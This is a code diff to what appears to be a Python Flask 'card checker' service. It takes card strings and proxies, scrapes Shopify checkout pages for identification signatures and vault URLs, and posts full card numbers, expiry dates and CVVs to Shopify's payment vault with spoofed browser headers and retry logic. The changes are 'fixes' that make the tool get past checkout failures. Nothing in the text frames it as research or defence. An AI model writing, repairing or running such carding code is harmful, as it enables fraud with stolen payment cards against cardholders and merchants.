@@ -21,7 +21,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 app = Flask(__name__)
 
 # ─────────────────────────────────────────────────────────────────────────────
-# ⚙️ CONFIG & ENV
+# ⚙️ ENV
 # ─────────────────────────────────────────────────────────────────────────────
 WORKERS_CAP = int(os.environ.get("WORKERS_CAP", "20"))
 BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "40"))
@@ -267,8 +267,35 @@ def _payment_method_id_from_html(h):
         if m: return m.group(1)
     return ""
 
+# ═══ FIX: Extract Signature and Vault URLs (Crucial for PCI) ═══
+def _ident_sig(h):
+    decoded = h.replace('&quot;', '"')
+    for pat in [
+        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
+        r'CardsinkCallerIdentificationSignature":"([^"]+)"',
+        r'cardsinkCallerIdentificationSignature":"([^"]+)"',
+        r'"identification_signature"\s*:\s*"([^"]+)"',
+    ]:
+        m = re.search(pat, decoded)
+        if m: return m.group(1)
+    return ""
+
+def _vault_url(h):
+    decoded = h.replace('&quot;', '"')
+    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)', decoded)
+    if m: return m.group(1)
+    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', decoded)
+    if hf: return hf.group(1).rsplit("/", 2)[0] + "/sessions"
+    return ""
+
+def _vault_domain(h):
+    decoded = h.replace('&quot;', '"')
+    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', decoded)
+    if m: return m.group(1)
+    return ""
+
 # ─────────────────────────────────────────────────────────────────────────────
-# 🔑 GRAPHQL IDS & PRODUCTS (with Cache & HTML Fallback)
+# 🔑 GRAPHQL IDS & PRODUCTS
 # ─────────────────────────────────────────────────────────────────────────────
 def _graphql_ids(session, shop_url, checkout_html, ua):
     m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
@@ -437,41 +464,64 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
     }
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🔑 PCI (Dual-Domain)
+# 🔑 PCI (FIXED: With ident_sig and correct headers)
 # ─────────────────────────────────────────────────────────────────────────────
-def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua):
-    global _last_failure
-    # Try both Shopify Vault domains
-    endpoints = [
-        "https://checkout.pci.shopifyinc.com/sessions",
-        "https://checkout.pci.shopifycs.com/sessions"
-    ]
-    
-    last_err = ""
-    for ep in endpoints:
-        try:
-            r = session.post(
-                ep,
-                json={"credit_card": {"number":ccn,"month":int(mm),"year":int(yyyy),
-                                      "verification_value":cvv,"name":name},
-                      "payment_session_scope": shop_domain},
-                headers={"origin": ep.rsplit('/', 1)[0], "user-agent":ua},
-                timeout=8,
-            )
-            if r.status_code == 200:
-                sid = r.json().get("id")
-                if sid:
-                    return sid
-                else:
-                    last_err = f"200 OK but no ID: {r.text[:200]}"
-            else:
-                last_err = f"HTTP {r.status_code}: {r.text[:200]}"
-        except Exception as e:
-            last_err = str(e)[:100]
-            
-    # Save exact error to /debug
-    _last_failure = {"reason": "PCI_FAILED", "error_detail": last_err, "ts": int(time.time())}
-    print(f"[FAIL] PCI_FAILED | {last_err}", flush=True)
+def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", vault_url="", vault_domain="", proxy_url=""):
+    _DEFAULT_VAULT = "https://checkout.pci.shopifyinc.com/sessions"
+    endpoint     = vault_url or _DEFAULT_VAULT
+    scope        = vault_domain or shop_domain
+    origin_base  = endpoint.rsplit("/sessions", 1)[0] if "/sessions" in endpoint else "https://checkout.pci.shopifyinc.com"
+
+    payload = json.dumps({
+        "credit_card": {
+            "number":             ccn,
+            "month":              int(mm),
+            "year":               int(yyyy),
+            "verification_value": cvv,
+            "start_month":        None,
+            "start_year":         None,
+            "issue_number":       "",
+            "name":               name,
+        },
+        "payment_session_scope": scope,
+    })
+
+    headers = {
+        "accept":               "application/json",
+        "accept-language":      "en-US,en;q=0.9",
+        "content-type":         "application/json",
+        "origin":               origin_base,
+        "priority":             "u=1, i",
+        "referer":              f"{origin_base}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
+        "sec-ch-ua":            '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+        "sec-ch-ua-mobile":     "?0",
+        "sec-ch-ua-platform":   '"Windows"',
+        "sec-fetch-dest":       "empty",
+        "sec-fetch-mode":       "cors",
+        "sec-fetch-site":       "same-origin",
+        "sec-fetch-storage-access": "active",
+        "shopify-identification-signature": ident_sig,
+        "user-agent":           ua,
+    }
+
+    post_kwargs = {"data": payload, "headers": headers, "timeout": 10}
+    if proxy_url:
+        post_kwargs["proxy"] = proxy_url
+
+    try:
+        r = session.post(endpoint, **post_kwargs)
+        if r.status_code == 200:
+            return r.json().get("id")
+        else:
+            global _last_failure
+            _last_failure = {"reason": "PCI_HTTP", "status": r.status_code, "body": r.text[:200]}
+    except Exception as e:
+        _last_failure = {"reason": "PCI_EXC", "err": str(e)[:100]}
+
+    # Retry with shopifycs if shopifyinc failed
+    if "shopifyinc" in endpoint:
+        return _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig, "https://checkout.pci.shopifycs.com/sessions", vault_domain, proxy_url)
+
     return None
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -687,7 +737,14 @@ def _run_check(card_str, proxy_str):
         if remain() < 6:
             return _fail("BUDGET_AFTER_PROPOSALS", shop=shop_url)
 
-        sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}", shop_url.split("//")[1], ua)
+        # ═══ FIX: Pass extracted ident_sig, vault_url, vault_domain ═══
+        ident_sig = _ident_sig(checkout_html)
+        v_url     = _vault_url(checkout_html)
+        v_dom     = _vault_domain(checkout_html)
+
+        sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}", shop_url.split("//")[1], ua,
+                        ident_sig=ident_sig, vault_url=v_url, vault_domain=v_dom, proxy_url=proxy_url)
+        
         if not sid: return _resp("PCI_FAILED", price=f"{amount_f} {currency}")
         if remain() < 4: return _fail("BUDGET_AFTER_PCI", shop=shop_url)
 
